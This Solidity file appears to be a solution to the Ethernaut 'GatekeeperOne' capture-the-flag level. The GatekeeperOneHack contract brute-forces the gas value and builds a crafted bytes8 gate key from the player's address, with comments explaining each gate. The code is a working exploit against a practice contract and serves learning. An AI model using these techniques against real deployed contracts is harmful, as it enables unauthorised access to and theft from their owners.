// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './GatekeeperOne.sol';

contract GatekeeperOneHack {

  using SafeMath for uint256;
  GatekeeperOne target;

  constructor() public {
    // pointer to deployed instance
    target = GatekeeperOne(0xd8C5310c3AA38FE4aD98D647dafFCad303bebaad);
  }
  
  function attack() public {
    // gate 1 is easily broken by simply using a contract to attack
    // bruteforce attack to break gate2, where gasleft() must be equal to 0 mod 8191
    // our bytes8 data 0xf0000000000036ee is derived from our public address.
    // in solidity, in explicit conversion, for eg uint32(uint64), higher bits are cut off, for downcasting, and for upcasting, number will remain the same.
    // note that one byte = 8 bits, so uint32 has 4 bytes and in hexa, 2 character represents one byte
    // for gatethree, there are three parts
    // part 1 where uint32(uint64) == uint16(uint64). this really just means, if we cut off 16-8=8 characters from the left, it must be same as when we cut off 16-4=12 characters (in hexa notation).
    // so, our gatekey, in hexa, must be of the form xxxxxxxx0000xxxx
    // part 2 says that if we cut off 8 characters from the left, the resulting number must be different from if we did nothing.
    // so our gatekey must be > 2**32-1, we can just set first character to f to achieve this
    // part 3 wants uint32(gatekey) == uint16(tx.orgin), which is similar to part 1, so we can just use the most right 4 characters of our player address as part of our key
    for(uint16 i = 0 ; i <= 8191 ; i++){
        try target.enter{gas: 8191*20 + i}(bytes8(0xf0000000000036ee)) {}
        catch (bytes memory reason){
            i = i;
        }
    }
  }

}
